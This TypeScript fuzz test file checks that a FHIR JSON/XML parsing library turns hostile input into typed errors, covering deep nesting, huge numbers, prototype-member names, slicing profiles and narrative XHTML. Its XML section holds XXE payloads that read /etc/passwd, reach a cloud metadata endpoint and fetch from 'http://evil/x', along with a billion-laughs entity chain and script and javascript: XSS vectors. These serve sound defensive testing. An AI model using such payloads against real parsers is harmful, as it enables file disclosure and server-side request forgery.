/**
 * FHIR-P11 fuzz tier (roadmap §6 "Fuzzing, JSON/XML-level, not byte-level").
 *
 * FHIR is transported as text, so the attack surface of this library is adversarial JSON and XML,
 * not byte framing. The single contract this file proves, at fuzz-scale run counts, across every
 * hostile-input shape the roadmap names (truncation, deep nesting, `_element` games, huge /
 * scientific-notation numbers, `resourceType` games, and, for XML, XXE / billion-laughs / undefined
 * entities, and hostile narrative XHTML: script variants, entities and nesting depth), is:
 *
 *   **Adversarial input never crashes, hangs, or OOMs, it becomes a *typed* error (a
 *   `FhirCodecError` / `FhirXmlError` whose `.code` is a registered fatal) or a bounded rejection,
 *   never an untyped throw (a `RangeError` stack overflow, a `TypeError`, …) and never a non-return.**
 *
 * A `RangeError` from unbounded recursion is the specific failure this guards: it is why the JSON
 * reader carries a `MAX_DEPTH_EXCEEDED` bound (mirroring the XML reader), so a tower of `[[[[…]]]]`
 * is refused with a typed fatal rather than overflowing V8's stack.
 *
 * This complements the round-trip / immutability property suites (`roundtrip.property.test.ts`,
 * `safety.property.test.ts`), those assert *correct* behavior on well-formed input; this asserts
 * *safe* behavior on hostile input.
 */

import { readFileSync, readdirSync } from "node:fs";

import fc from "fast-check";
import { describe, expect, it } from "vitest";

import {
  FATAL_CODES,
  FhirCodecError,
  FhirXmlError,
  loadStructureDefinition,
  NDJSON_ERROR_CODES,
  XML_FATAL_CODES,
  parseNdjsonLine,
  parseResource,
  parseResourceXml,
  readRawJson,
  readRawXml,
  serializeResource,
  SLICE_UNCHECKED_REASONS,
  validateResource,
  VALIDATION_CODES,
  type StructureDefinition,
} from "../src/index.js";

import { propertyRun } from "./_property-run.js";

/**
 * High run count, fixed seed, deterministic fuzz-scale reproduction (mirrors the hl7 fuzz harness).
 * The count is CI-tunable via `FUZZ_RUNS` (the dedicated `fuzz` CI job raises it); the fixed seed
 * keeps a failure reproducible regardless of the count. `COSYTE_PROPERTY_RUNS` and
 * `COSYTE_PROPERTY_SEED` win over both, as for every property here (`./_property-run.ts`), which
 * is how the nightly run takes the fuzz properties to its depth from a seed of its own.
 */
const FUZZ_RUNS = Number.parseInt(process.env["FUZZ_RUNS"] ?? "", 10);
const FUZZ_SEED = 0x07_18_2026;
const RUN_CONFIG = propertyRun({
  numRuns: Number.isFinite(FUZZ_RUNS) && FUZZ_RUNS > 0 ? FUZZ_RUNS : 1000,
  seed: FUZZ_SEED,
});

const JSON_FATAL_SET: ReadonlySet<string> = new Set(Object.values(FATAL_CODES));
const XML_FATAL_SET: ReadonlySet<string> = new Set(Object.values(XML_FATAL_CODES));

const FIXTURE_DIR = new URL("./__fixtures__/", import.meta.url);

/** Every `.json` fixture, loaded once. These are spec-clean / quirk synthetic resources. */
const JSON_FIXTURES: readonly string[] = readdirSync(FIXTURE_DIR)
  .filter((f) => f.endsWith(".json"))
  .map((f) => readFileSync(new URL(f, FIXTURE_DIR), "utf8"))
  .filter((s) => s.length > 0);

/** Every `.xml` fixture, loaded once. */
const XML_FIXTURES: readonly string[] = readdirSync(FIXTURE_DIR)
  .filter((f) => f.endsWith(".xml"))
  .map((f) => readFileSync(new URL(f, FIXTURE_DIR), "utf8"))
  .filter((s) => s.length > 0);

// ── JSON contract ────────────────────────────────────────────────────────────────────────────────

/**
 * `parseResource` / `readRawJson` on `raw` either return, or throw a {@link FhirCodecError} whose
 * `.code` is a registered JSON fatal. Any other throw (a `RangeError`, a `TypeError`, a bare `Error`,
 * or a `FhirCodecError` with an unregistered code) fails the property immediately. Returns the parsed
 * resource, or `undefined` if it was a (typed) fatal.
 */
function assertJsonSafe(raw: string): ReturnType<typeof parseResource> | undefined {
  // The raw reader must obey the same contract on its own (it is a public entry point).
  try {
    readRawJson(raw);
  } catch (err) {
    expect(err, "readRawJson threw a non-FhirCodecError").toBeInstanceOf(FhirCodecError);
    if (err instanceof FhirCodecError) {
      expect(
        JSON_FATAL_SET.has(err.code),
        `readRawJson threw with unregistered code ${JSON.stringify(err.code)}`,
      ).toBe(true);
    }
  }
  try {
    const result = parseResource(raw);
    // A clean return always carries a value-free issues array.
    expect(Array.isArray(result.issues)).toBe(true);
    return result;
  } catch (err) {
    expect(err, "parseResource threw a non-FhirCodecError").toBeInstanceOf(FhirCodecError);
    if (err instanceof FhirCodecError) {
      expect(
        JSON_FATAL_SET.has(err.code),
        `parseResource threw with unregistered code ${JSON.stringify(err.code)}`,
      ).toBe(true);
    }
    return undefined;
  }
}

/** The structural characters a JSON mutator injects / duplicates / drops. */
const JSON_MUTATION_CHARS = ["{", "}", "[", "]", ":", ",", '"', "\\", "0", "e", ".", "-"] as const;

/** Apply a sequence of inject/duplicate/drop point-mutations to a base string. */
function mutated(base: string, mutations: readonly Mutation[]): string {
  let s = base;
  for (const m of mutations) {
    if (s.length === 0) break;
    const offset = Math.min(s.length - 1, Math.floor(m.offsetFrac * s.length));
    switch (m.op) {
      case "inject":
        s = s.slice(0, offset) + m.char + s.slice(offset);
        break;
      case "duplicate":
        s = s.slice(0, offset) + (s[offset] ?? "") + s.slice(offset);
        break;
      case "drop":
        s = s.slice(0, offset) + s.slice(offset + 1);
        break;
    }
  }
  return s;
}

interface Mutation {
  readonly op: "inject" | "duplicate" | "drop";
  readonly offsetFrac: number;
  readonly char: string;
}

function mutationArb(chars: readonly string[]): fc.Arbitrary<Mutation> {
  return fc.record({
    op: fc.constantFrom("inject", "duplicate", "drop"),
    offsetFrac: fc.double({ min: 0, max: 1, noNaN: true }),
    char: fc.constantFrom(...chars),
  });
}

/** Structure-char mutations of a real, spec-clean JSON fixture, malformed-but-JSON-shaped input. */
function mutatedJsonFixture(): fc.Arbitrary<string> {
  return fc
    .record({
      base: fc.constantFrom(...JSON_FIXTURES),
      mutations: fc.array(mutationArb(JSON_MUTATION_CHARS), { minLength: 1, maxLength: 15 }),
    })
    .map(({ base, mutations }) => mutated(base, mutations));
}

/** Truncation of a real fixture at every prefix length. */
function truncatedFixture(fixtures: readonly string[]): fc.Arbitrary<string> {
  return fc
    .record({
      base: fc.constantFrom(...fixtures),
      cutFrac: fc.double({ min: 0, max: 1, noNaN: true }),
    })
    .map(({ base, cutFrac }) => base.slice(0, Math.floor(cutFrac * base.length)));
}

describe("fuzz: corpus is loaded (a 0-fixture corpus would make every property vacuous)", () => {
  it("has JSON and XML fixtures", () => {
    expect(JSON_FIXTURES.length).toBeGreaterThan(0);
    expect(XML_FIXTURES.length).toBeGreaterThan(0);
  });
});

describe("fuzz: JSON, arbitrary bytes never throw except a registered FhirCodecError", () => {
  it("random unicode/binary strings", () => {
    fc.assert(
      fc.property(fc.string({ minLength: 0, maxLength: 400, unit: "binary" }), (raw) => {
        assertJsonSafe(raw);
      }),
      RUN_CONFIG,
    );
  });

  it("strings drawn loosely from the JSON alphabet", () => {
    const jsonish = fc.string({
      unit: fc.constantFrom(...'{}[]:,"\\0123456789.-eEtruefalsnull ABCabc'.split("")),
      minLength: 0,
      maxLength: 200,
    });
    fc.assert(
      fc.property(jsonish, (raw) => {
        assertJsonSafe(raw);
      }),
      RUN_CONFIG,
    );
  });
});

describe("fuzz: JSON, structural mutation & truncation of spec-clean fixtures never crash", () => {
  it("inject/duplicate/drop of JSON structural characters", () => {
    fc.assert(
      fc.property(mutatedJsonFixture(), (raw) => {
        assertJsonSafe(raw);
      }),
      RUN_CONFIG,
    );
  });

  it("every truncation length of every JSON fixture", () => {
    fc.assert(
      fc.property(truncatedFixture(JSON_FIXTURES), (raw) => {
        assertJsonSafe(raw);
      }),
      RUN_CONFIG,
    );
  });
});

describe("fuzz: JSON, deep nesting is a typed MAX_DEPTH_EXCEEDED, never a stack overflow", () => {
  // The whole point of the bound: without it, these overflow V8's stack with an untyped RangeError.
  it("a tower of arrays past the bound", () => {
    fc.assert(
      fc.property(fc.integer({ min: 300, max: 20_000 }), (depth) => {
        let error: unknown;
        try {
          parseResource("[".repeat(depth) + "]".repeat(depth));
        } catch (err) {
          error = err;
        }
        expect(error).toBeInstanceOf(FhirCodecError);
        expect((error as FhirCodecError).code).toBe(FATAL_CODES.MAX_DEPTH_EXCEEDED);
      }),
      // 50 cases on a pull request, not the fuzz count: each builds and reads a document up to
      // 20,000 levels deep. The nightly depth runs it at 10,000.
      propertyRun({ numRuns: 50, seed: FUZZ_SEED }),
    );
  });

  it("a tower of objects past the bound", () => {
    const depth = 20_000;
    const raw = '{"a":'.repeat(depth) + "1" + "}".repeat(depth);
    expect(() => parseResource(raw)).toThrow(FhirCodecError);
    try {
      parseResource(raw);
    } catch (err) {
      expect((err as FhirCodecError).code).toBe(FATAL_CODES.MAX_DEPTH_EXCEEDED);
    }
  });

  it("nesting just under the bound still parses (the bound rejects only the pathological)", () => {
    const under = 250;
    const raw = `{"resourceType":"X","a":${"[".repeat(under)}1${"]".repeat(under)}}`;
    expect(() => parseResource(raw)).not.toThrow();
  });
});

describe("fuzz: JSON, huge / scientific-notation numbers are preserved, never crash or corrupt", () => {
  it("adversarial number literals round-trip as text with a precision flag, no throw", () => {
    const digits = fc.string({
      unit: fc.constantFrom(..."0123456789".split("")),
      minLength: 1,
      maxLength: 40,
    });
    // A valid JSON integer part: a single `0`, or a nonzero digit followed by any digits (no leading
    // zeros, the reader correctly rejects `00.0` as MALFORMED, so we do not generate it here).
    const intPart = fc.oneof(
      fc.constant("0"),
      fc
        .tuple(fc.constantFrom(..."123456789".split("")), digits)
        .map(([head, rest]) => head + rest),
    );
    const numberLiteral = fc.oneof(
      fc.constant("1e999999"),
      fc.constant("-9.99e-9999"),
      fc.constant("9223372036854775807"),
      fc.constant("0.00000000000000010"),
      intPart,
      fc.tuple(intPart, digits).map(([i, f]) => `${i}.${f}`),
      fc.tuple(intPart, digits).map(([i, e]) => `${i}e${e}`),
    );
    fc.assert(
      fc.property(numberLiteral, (lit) => {
        const raw = `{"resourceType":"Observation","valueQuantity":{"value":${lit}}}`;
        const result = assertJsonSafe(raw);
        // A well-formed number literal must parse cleanly (never a fatal), and never a JS number.
        expect(result).toBeDefined();
      }),
      RUN_CONFIG,
    );
  });

  it("a finite-as-double value with an astronomical exponent parses without RangeError or hang", () => {
    // Regression: `0e9999999999999999999` (and other values that underflow/collapse to a finite
    // double but decompose to an astronomical scale) once threw an untyped `RangeError`, the
    // precision check aligned scales with `10n ** thatScale`, exploding the BigInt. It must be a
    // clean parse now (the value is preserved as its exact lexical text, flagged at-risk).
    for (const lit of [
      "0e9999999999999999999",
      "0e79299880000194370865717",
      "1e-999999999999",
      "0.00000000424242e-99999999",
    ]) {
      const raw = `{"resourceType":"Observation","valueQuantity":{"value":${lit}}}`;
      const result = assertJsonSafe(raw);
      expect(result).toBeDefined();
    }
  });
});

describe("fuzz: JSON, misaligned `_element` arrays fail closed with a typed fatal, never a wrong-value merge", () => {
  it("random length disagreements between a primitive array and its _-sibling", () => {
    fc.assert(
      fc.property(
        fc.integer({ min: 0, max: 6 }),
        fc.integer({ min: 0, max: 6 }),
        (nValues, nMeta) => {
          const values = Array.from({ length: nValues }, (_, i) => `"g${String(i)}"`).join(",");
          const metas = Array.from({ length: nMeta }, () => "null").join(",");
          const raw = `{"resourceType":"Patient","given":[${values}],"_given":[${metas}]}`;
          let threw: FhirCodecError | undefined;
          try {
            parseResource(raw);
          } catch (err) {
            expect(err).toBeInstanceOf(FhirCodecError);
            threw = err as FhirCodecError;
          }
          // Equal lengths (including 0/0) are aligned and must NOT throw; unequal MUST fail closed.
          if (nValues === nMeta) {
            expect(threw).toBeUndefined();
          } else {
            expect(threw?.code).toBe(FATAL_CODES.PRIMITIVE_EXTENSION_MISALIGNED);
          }
        },
      ),
      RUN_CONFIG,
    );
  });
});

describe("fuzz: JSON, validateResource never throws over any resource that parsed", () => {
  it("validation is total on the fuzz/mutation corpus", () => {
    const anyJson = fc.oneof(
      { weight: 1, arbitrary: fc.string({ minLength: 0, maxLength: 200, unit: "binary" }) },
      { weight: 3, arbitrary: mutatedJsonFixture() },
      { weight: 2, arbitrary: truncatedFixture(JSON_FIXTURES) },
    );
    fc.assert(
      fc.property(anyJson, (raw) => {
        const result = assertJsonSafe(raw);
        if (result === undefined) return; // typed fatal on parse, nothing to validate
        expect(() => validateResource(result.resource)).not.toThrow();
      }),
      RUN_CONFIG,
    );
  });
});

/**
 * Synthetic profiles that slice by `type` and `profile` discriminators, every path form this library
 * walks: a choice element's `$this`, a resource held in place (`resource`), and `resolve()` through
 * `contained` and Bundle entries. Each profile's slices name another of these profiles, so a
 * profile check nests and can meet itself.
 */
const SLICING_PROFILES: readonly StructureDefinition[] = [
  {
    resourceType: "StructureDefinition",
    url: "http://example.org/StructureDefinition/fuzz-observation",
    type: "Observation",
    snapshot: {
      element: [
        {
          id: "Observation",
          path: "Observation",
          // A nested profile check runs these too: an error one decides, a warning one does not,
          // and an unevaluable one leaves the check undecided.
          constraint: [
            { key: "fuzz-1", severity: "error", expression: "code.exists()" },
            { key: "fuzz-2", severity: "warning", expression: "note.exists()" },
          ],
        },
        {
          id: "Observation.derivedFrom",
          path: "Observation.derivedFrom",
          constraint: [{ key: "fuzz-3", severity: "error", expression: "resolve().exists()" }],
        },
        {
          id: "Observation.interpretation",
          path: "Observation.interpretation",
          binding: { strength: "required", valueSet: "http://example.org/ValueSet/fuzz-interp" },
        },
        {
          id: "Observation.value[x]",
          path: "Observation.value[x]",
          slicing: { discriminator: [{ type: "type", path: "$this" }], rules: "closed" },
        },
        {
          id: "Observation.value[x]:valueQuantity",
          path: "Observation.value[x]",
          sliceName: "valueQuantity",
          min: 1,
          type: [{ code: "Quantity" }],
        },
        {
          id: "Observation.value[x]:valueQuantity.system",
          path: "Observation.value[x].system",
          min: 1,
        },
        {
          id: "Observation.hasMember",
          path: "Observation.hasMember",
          slicing: { discriminator: [{ type: "profile", path: "resolve()" }], rules: "closed" },
        },
        {
          id: "Observation.hasMember:member",
          path: "Observation.hasMember",
          sliceName: "member",
          type: [
            {
              code: "Reference",
              targetProfile: ["http://example.org/StructureDefinition/fuzz-observation"],
            },
          ],
        },
        {
          id: "Observation.performer",
          path: "Observation.performer",
          slicing: { discriminator: [{ type: "type", path: "resolve()" }], rules: "open" },
        },
        {
          id: "Observation.performer:patient",
          path: "Observation.performer",
          sliceName: "patient",
          min: 1,
          type: [
            {
              code: "Reference",
              targetProfile: ["http://hl7.org/fhir/StructureDefinition/Patient"],
            },
          ],
        },
      ],
    },
  },
  {
    resourceType: "StructureDefinition",
    url: "http://example.org/StructureDefinition/fuzz-bundle",
    type: "Bundle",
    snapshot: {
      element: [
        { id: "Bundle", path: "Bundle" },
        {
          id: "Bundle.entry",
          path: "Bundle.entry",
          slicing: {
            discriminator: [
              { type: "type", path: "resource" },
              { type: "profile", path: "resource" },
            ],
            rules: "closed",
          },
        },
        { id: "Bundle.entry:obs", path: "Bundle.entry", sliceName: "obs", min: 1 },
        {
          id: "Bundle.entry:obs.resource",
          path: "Bundle.entry.resource",
          type: [
            {
              code: "Observation",
              profile: ["http://example.org/StructureDefinition/fuzz-observation"],
            },
          ],
        },
        { id: "Bundle.entry:obs.fullUrl", path: "Bundle.entry.fullUrl", min: 1 },
      ],
    },
  },
].map((sd) => {
  const loaded = loadStructureDefinition(parseResource(JSON.stringify(sd)).resource);
  if (loaded === undefined) throw new Error("a fuzz profile did not load");
  return loaded;
});

const VALIDATION_CODE_SET: ReadonlySet<string> = new Set(Object.values(VALIDATION_CODES));
const SLICE_REASON_SET: ReadonlySet<string> = new Set(Object.values(SLICE_UNCHECKED_REASONS));

/** Reference strings a hostile document points at: fragments, prototype names, URLs, nothing. */
const HOSTILE_REFERENCE = fc.constantFrom(
  "#",
  "#a",
  "#b",
  "#__proto__",
  "#constructor",
  "Observation/a",
  "urn:uuid:a",
  "urn:uuid:b",
  "https://example.org/fhir/Observation/a",
  "",
  "resolve()",
);

/** A contained or entry Observation that references others, possibly itself, with a choice value. */
function hostileObservation(id: string): fc.Arbitrary<Record<string, unknown>> {
  return fc.record(
    {
      resourceType: fc.constantFrom("Observation", "Patient", "", "__proto__"),
      id: fc.constant(id),
      valueQuantity: fc.constantFrom({ system: "x" }, {}, [], "x", null),
      valueString: fc.constantFrom("x", 1, {}),
      code: fc.constantFrom({ text: "fake" }, {}, "x"),
      interpretation: fc.constantFrom([{ text: "fake" }], [], "x"),
      derivedFrom: fc.array(
        HOSTILE_REFERENCE.map((reference) => ({ reference })),
        { maxLength: 1 },
      ),
      hasMember: fc.array(
        fc.oneof(
          HOSTILE_REFERENCE.map((reference) => ({ reference })),
          fc.constantFrom({}, "x", [], { reference: 1 }),
        ),
        { maxLength: 4 },
      ),
      performer: fc.array(
        HOSTILE_REFERENCE.map((reference) => ({ reference })),
        { maxLength: 2 },
      ),
    },
    { requiredKeys: ["id"] },
  );
}

/** A hostile Observation or Bundle built around the slicing profiles' paths. */
const hostileSlicingDocument: fc.Arbitrary<string> = fc.oneof(
  fc
    .tuple(hostileObservation("root"), fc.array(fc.constantFrom("a", "b"), { maxLength: 3 }))
    .chain(([root, ids]) =>
      fc
        .tuple(...ids.map((id) => hostileObservation(id)))
        .map((contained) => ({ ...root, resourceType: "Observation", contained })),
    )
    .map((doc) => JSON.stringify(doc)),
  fc
    .array(
      fc.oneof(
        fc.record({
          fullUrl: fc.constantFrom("urn:uuid:a", "urn:uuid:b", "Observation/a", ""),
          resource: fc.oneof(hostileObservation("a"), hostileObservation("b"), fc.constant("x")),
        }),
        fc.constantFrom<unknown>("x", 1, null, []),
      ),
      { maxLength: 4 },
    )
    .map((entry) => JSON.stringify({ resourceType: "Bundle", type: "collection", entry })),
);

describe("fuzz: JSON, type and profile slicing discriminators never throw and stay value-free", () => {
  it("validation against slicing profiles is total, and every unchecked slicing names a reason", () => {
    const anyJson = fc.oneof(
      { weight: 3, arbitrary: hostileSlicingDocument },
      { weight: 2, arbitrary: mutatedJsonFixture() },
      { weight: 1, arbitrary: truncatedFixture(JSON_FIXTURES) },
    );
    fc.assert(
      fc.property(anyJson, (raw) => {
        const result = assertJsonSafe(raw);
        if (result === undefined) return;
        const { issues } = validateResource(result.resource, { profiles: SLICING_PROFILES });
        for (const issue of issues) {
          expect(VALIDATION_CODE_SET.has(issue.code)).toBe(true);
          if (issue.code === "PROFILE_SLICE_UNCHECKED") {
            expect(SLICE_REASON_SET.has(String(issue.sliceReason))).toBe(true);
          } else {
            expect(issue.sliceReason).toBeUndefined();
          }
        }
      }),
      RUN_CONFIG,
    );
  });
});

describe("fuzz: JSON, survivor round-trip: anything that parses serializes and re-parses", () => {
  it("parseResource(serializeResource(x)) never throws for a survivor", () => {
    const anyJson = fc.oneof(
      { weight: 1, arbitrary: fc.string({ minLength: 0, maxLength: 200, unit: "binary" }) },
      { weight: 3, arbitrary: mutatedJsonFixture() },
      { weight: 2, arbitrary: truncatedFixture(JSON_FIXTURES) },
    );
    fc.assert(
      fc.property(anyJson, (raw) => {
        const result = assertJsonSafe(raw);
        if (result === undefined) return;
        const serialized = serializeResource(result.resource);
        expect(() => parseResource(serialized)).not.toThrow();
      }),
      RUN_CONFIG,
    );
  });
});

describe("fuzz: JSON, prototype-chain property names never fault the validator", () => {
  // Regression: a resource property literally named `constructor` / `toString` / `valueOf` /
  // `hasOwnProperty` / `__proto__` once crashed `validateResource` with an uncaught `TypeError`,
  // because a plain-object schema lookup read an inherited `Object.prototype` member instead of an
  // `ElementSchema`. An adversarial resource must never be able to fault the validator.
  const dangerousNames = [
    "constructor",
    "__proto__",
    "prototype",
    "toString",
    "valueOf",
    "hasOwnProperty",
    "isPrototypeOf",
    "__defineGetter__",
  ] as const;

  it("a resource carrying any prototype-member property name validates without throwing", () => {
    fc.assert(
      fc.property(
        fc.constantFrom(...dangerousNames),
        fc.constantFrom("Patient", "Observation", "AllergyIntolerance"),
        (name, rt) => {
          const raw = `{"resourceType":"${rt}","${name}":"x"}`;
          const result = assertJsonSafe(raw);
          if (result === undefined) return;
          expect(() => validateResource(result.resource)).not.toThrow();
        },
      ),
      RUN_CONFIG,
    );
  });

  it("nested prototype-member property names are also safe", () => {
    for (const name of dangerousNames) {
      const raw = `{"resourceType":"Patient","name":[{"${name}":"x"}]}`;
      const { resource } = parseResource(raw);
      expect(() => validateResource(resource)).not.toThrow();
    }
  });
});

// ── XML contract ─────────────────────────────────────────────────────────────────────────────────

/**
 * `parseResourceXml` / `readRawXml` on `raw` either return, or throw a {@link FhirXmlError} whose
 * `.code` is a registered XML fatal. Any other throw fails the property immediately.
 */
function assertXmlSafe(raw: string): ReturnType<typeof parseResourceXml> | undefined {
  try {
    readRawXml(raw);
  } catch (err) {
    expect(err, "readRawXml threw a non-FhirXmlError").toBeInstanceOf(FhirXmlError);
    if (err instanceof FhirXmlError) {
      expect(
        XML_FATAL_SET.has(err.code),
        `readRawXml threw with unregistered code ${JSON.stringify(err.code)}`,
      ).toBe(true);
    }
  }
  try {
    const result = parseResourceXml(raw);
    expect(Array.isArray(result.issues)).toBe(true);
    return result;
  } catch (err) {
    expect(err, "parseResourceXml threw a non-FhirXmlError").toBeInstanceOf(FhirXmlError);
    if (err instanceof FhirXmlError) {
      expect(
        XML_FATAL_SET.has(err.code),
        `parseResourceXml threw with unregistered code ${JSON.stringify(err.code)}`,
      ).toBe(true);
    }
    return undefined;
  }
}

const XML_MUTATION_CHARS = ["<", ">", "/", "=", '"', "&", ";", "?", "!", "-", " "] as const;

function mutatedXmlFixture(): fc.Arbitrary<string> {
  return fc
    .record({
      base: fc.constantFrom(...XML_FIXTURES),
      mutations: fc.array(mutationArb(XML_MUTATION_CHARS), { minLength: 1, maxLength: 15 }),
    })
    .map(({ base, mutations }) => mutated(base, mutations));
}

describe("fuzz: XML, arbitrary bytes never throw except a registered FhirXmlError", () => {
  it("random unicode/binary strings", () => {
    fc.assert(
      fc.property(fc.string({ minLength: 0, maxLength: 400, unit: "binary" }), (raw) => {
        assertXmlSafe(raw);
      }),
      RUN_CONFIG,
    );
  });

  it("strings drawn loosely from the XML alphabet", () => {
    const xmlish = fc.string({
      unit: fc.constantFrom(...'<>/="&;?!- abcABC0123DOCTYPEentitySYSTEM'.split("")),
      minLength: 0,
      maxLength: 200,
    });
    fc.assert(
      fc.property(xmlish, (raw) => {
        assertXmlSafe(raw);
      }),
      RUN_CONFIG,
    );
  });
});

describe("fuzz: XML, mutation & truncation of spec-clean fixtures never crash", () => {
  it("inject/duplicate/drop of XML structural characters", () => {
    fc.assert(
      fc.property(mutatedXmlFixture(), (raw) => {
        assertXmlSafe(raw);
      }),
      RUN_CONFIG,
    );
  });

  it("every truncation length of every XML fixture", () => {
    fc.assert(
      fc.property(truncatedFixture(XML_FIXTURES), (raw) => {
        assertXmlSafe(raw);
      }),
      RUN_CONFIG,
    );
  });
});

describe("fuzz: XML, XXE / billion-laughs / entity attacks are refused by construction", () => {
  it("any DOCTYPE (the XXE + billion-laughs vector) is refused with DTD_FORBIDDEN, no I/O, no expansion", () => {
    const payloads = [
      // Classic XXE, external entity pointing at a local file.
      '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><Patient><name value="&x;"/></Patient>',
      // Classic XXE, external entity over the network (SSRF).
      '<!DOCTYPE r [<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/">]><Patient/>',
      // Billion-laughs, nested internal entities, exponential expansion.
      '<!DOCTYPE lolz [<!ENTITY a "aa"><!ENTITY b "&a;&a;"><!ENTITY c "&b;&b;">]><Patient><name value="&c;"/></Patient>',
      // Parameter-entity variant.
      '<!DOCTYPE r [<!ENTITY % p SYSTEM "http://evil/x">%p;]><Patient/>',
      // A bare DOCTYPE with no internal subset.
      "<!DOCTYPE Patient><Patient/>",
    ];
    for (const raw of payloads) {
      let error: unknown;
      try {
        readRawXml(raw);
      } catch (err) {
        error = err;
      }
      expect(error).toBeInstanceOf(FhirXmlError);
      expect((error as FhirXmlError).code).toBe(XML_FATAL_CODES.DTD_FORBIDDEN);
    }
  });

  it("a leading DOCTYPE is refused wherever whitespace/prolog precedes it (fuzzed prolog)", () => {
    fc.assert(
      fc.property(
        fc.string({ unit: fc.constantFrom(" ", "\t", "\n", "\r"), minLength: 0, maxLength: 8 }),
        (ws) => {
          const raw = `${ws}<!DOCTYPE x [<!ENTITY e "boom">]><Patient/>`;
          // With an XML declaration or not; the reader must still refuse the DTD.
          let error: unknown;
          try {
            readRawXml(raw);
          } catch (err) {
            error = err;
          }
          expect(error).toBeInstanceOf(FhirXmlError);
          expect((error as FhirXmlError).code).toBe(XML_FATAL_CODES.DTD_FORBIDDEN);
        },
      ),
      // 100 cases on a pull request: the prolog draws from four characters up to eight long, so
      // the fuzz count would repeat the same few hundred inputs. The nightly depth runs 10,000.
      propertyRun({ numRuns: 100, seed: FUZZ_SEED }),
    );
  });

  it("a prototype-member entity name is refused, never resolved through Object.prototype", () => {
    // Regression: `&constructor;` / `&toString;` / `&__proto__;` once resolved, because the
    // predefined-entity lookup read inherited `Object.prototype` members. Only the five own names
    // are defined; everything else is UNDEFINED_ENTITY.
    for (const name of ["constructor", "toString", "valueOf", "hasOwnProperty", "__proto__"]) {
      let error: unknown;
      try {
        readRawXml(`<Patient><name value="&${name};"/></Patient>`);
      } catch (err) {
        error = err;
      }
      expect(error).toBeInstanceOf(FhirXmlError);
      expect((error as FhirXmlError).code).toBe(XML_FATAL_CODES.UNDEFINED_ENTITY);
    }
  });

  it("an undefined named entity (no DTD present) is refused with UNDEFINED_ENTITY, never resolved", () => {
    fc.assert(
      fc.property(
        fc
          .string({
            unit: fc.constantFrom(..."abcdefghijklmnopqrstuvwxyzABCXYZ0123".split("")),
            minLength: 1,
            maxLength: 12,
          })
          .filter((n) => !["amp", "lt", "gt", "quot", "apos"].includes(n)),
        (name) => {
          const raw = `<Patient><name value="&${name};"/></Patient>`;
          let error: unknown;
          try {
            readRawXml(raw);
          } catch (err) {
            error = err;
          }
          expect(error).toBeInstanceOf(FhirXmlError);
          expect((error as FhirXmlError).code).toBe(XML_FATAL_CODES.UNDEFINED_ENTITY);
        },
      ),
      RUN_CONFIG,
    );
  });
});

describe("fuzz: XML, deep nesting is a typed MAX_DEPTH_EXCEEDED, never a stack overflow", () => {
  it("a tower of elements past the bound", () => {
    fc.assert(
      fc.property(fc.integer({ min: 300, max: 20_000 }), (depth) => {
        let error: unknown;
        try {
          readRawXml("<a>".repeat(depth) + "</a>".repeat(depth));
        } catch (err) {
          error = err;
        }
        expect(error).toBeInstanceOf(FhirXmlError);
        expect((error as FhirXmlError).code).toBe(XML_FATAL_CODES.MAX_DEPTH_EXCEEDED);
      }),
      // 50 cases on a pull request, not the fuzz count: each builds and reads a document up to
      // 20,000 levels deep. The nightly depth runs it at 10,000.
      propertyRun({ numRuns: 50, seed: FUZZ_SEED }),
    );
  });
});

// ── Narrative XHTML contract ─────────────────────────────────────────────────────────────────────

/** A value no rule could print by accident; seeing it in a finding means the narrative leaked. */
const NARRATIVE_SENTINEL = "Qqzxnarrativesentinel";

/**
 * Pieces of hostile narrative markup: script in every spelling a renderer might run, event
 * handlers, script URLs, entities predefined, HTML-only, undefined, numeric and broken, markup
 * declarations, foreign namespaces, and the sentinel as text, as a name and as an attribute value.
 * Joined at random they are as often malformed as well-formed, which is the point.
 */
const NARRATIVE_PIECES: readonly string[] = [
  "<p>",
  "</p>",
  "<span>",
  "</span>",
  "<div>",
  "</div>",
  "<table><tr><td>",
  "</td></tr></table>",
  "<br/>",
  '<img src="#a"/>',
  "<script>",
  "</script>",
  "<SCRIPT>",
  "</SCRIPT>",
  "<ScRiPt/>",
  '<svg xmlns="urn:x"><script>1</script></svg>',
  '<iframe src="https://example.org"/>',
  "<object/>",
  "<font>",
  "</font>",
  '<p onclick="1">',
  '<img src="#a" ONERROR="1"/>',
  '<a href="javascript:void(0)">',
  '<a href=" &#106;avascript:1">',
  '<a href="java&#9;script:1">',
  '<area href="jav&#x9;ascript:1"/>',
  "</a>",
  '<p data-x="1">',
  '<p xml:lang="en">',
  '<p xmlns="">',
  '<h:p xmlns:h="http://www.w3.org/1999/xhtml">',
  "</h:p>",
  "&amp;",
  "&lt;",
  "&nbsp;",
  "&undefined;",
  "&#x41;",
  "&#xD800;",
  "&#99999999;",
  "&",
  "<![CDATA[x]]>",
  "<!-- c -->",
  "<!DOCTYPE div>",
  '<!ENTITY a "b">',
  "<?pi x?>",
  " ",
  "\n",
  NARRATIVE_SENTINEL,
  `<${NARRATIVE_SENTINEL}>`,
  `</${NARRATIVE_SENTINEL}>`,
  `<p ${NARRATIVE_SENTINEL}="x">`,
  `<p title="${NARRATIVE_SENTINEL}">`,
];

/** A hostile narrative: random pieces, often inside the XHTML root, sometimes nested very deep. */
function hostileNarrative(): fc.Arbitrary<string> {
  const body = fc
    .array(fc.constantFrom(...NARRATIVE_PIECES), { minLength: 0, maxLength: 40 })
    .map((parts) => parts.join(""));
  const deep = fc
    .tuple(fc.integer({ min: 0, max: 600 }), fc.constantFrom("span", "p", "div", "script", "b"))
    .map(
      ([depth, tag]) =>
        `${`<${tag}>`.repeat(depth)}${NARRATIVE_SENTINEL}${`</${tag}>`.repeat(depth)}`,
    );
  const inner = fc.oneof(body, deep);
  return fc.oneof(
    {
      weight: 4,
      arbitrary: inner.map((x) => `<div xmlns="http://www.w3.org/1999/xhtml">${x}</div>`),
    },
    { weight: 1, arbitrary: inner },
  );
}

describe("fuzz: narrative XHTML, hostile markup is checked, never echoed, never changed", () => {
  const codes: ReadonlySet<string> = new Set(Object.keys(VALIDATION_CODES));

  it("validation never throws, reports only registered codes, and leaves the div byte for byte", () => {
    fc.assert(
      fc.property(
        hostileNarrative(),
        fc.constantFrom("lenient" as const, "strict" as const),
        (div, mode) => {
          const text = JSON.stringify({
            resourceType: "Patient",
            text: { status: "generated", div },
          });
          const { resource } = parseResource(text);
